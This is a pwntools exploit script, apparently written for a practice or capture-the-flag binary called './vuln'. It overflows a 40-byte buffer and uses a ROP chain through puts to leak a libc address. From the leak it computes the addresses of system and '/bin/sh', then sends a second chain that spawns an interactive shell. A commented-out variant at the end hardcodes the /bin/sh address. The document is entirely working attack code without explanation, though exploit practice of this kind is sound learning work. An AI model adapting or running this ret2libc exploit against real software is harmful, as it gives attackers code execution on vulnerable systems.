from pwn import * 

p = process("./vuln")

pop_rdi_ret = p64(0x00000000004011bb)
puts_got    = p64(0x404018)
puts_plt    = p64(0x0000000000401030)
main        = p64(0x0000000000401132)

payload = "".join([
		"A"*40,
		pop_rdi_ret,
		puts_got, # argument of puts 
		puts_plt, # function to be executed
		main      # ret address
	])

p.sendline(payload)
p.recvuntil('ROP.')
leak = u64(p.recv().split()[0].ljust(8,"\x00"))
log.info("Leaked libc address,  puts :"+hex(leak))
libc_base = leak-0x74040


print hex(libc_base)
new_system = libc_base + 0x46ff0
binsh = new_system + 1297662

exploit = 'A'*40
exploit+= pop_rdi_ret
exploit+= p64(binsh)
exploit+=p64(new_system)
p.sendline(exploit)
p.interactive()
'''
payload = "".join([
		"A"*40,
		pop_rdi_ret,
		p64(0x7ffff7f74cee), # /bin/sh
		0x0000
	])

#print payload
p.sendlineafter("ROP.", payload)
p.interactive()
'''